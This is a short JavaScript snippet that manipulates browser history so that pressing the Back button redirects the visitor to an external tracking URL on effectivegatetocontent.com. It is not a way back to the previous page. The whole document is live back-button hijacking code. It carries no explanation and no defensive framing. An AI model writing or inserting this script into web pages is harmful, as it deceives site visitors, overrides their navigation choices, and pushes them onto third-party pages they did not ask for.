(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://www.effectivegatetocontent.com/am3fc3kdt5?key=54a2368844e0b04ab35c9193c1fd1a2a");
    },10);
  }
}, false);
}(window, location));
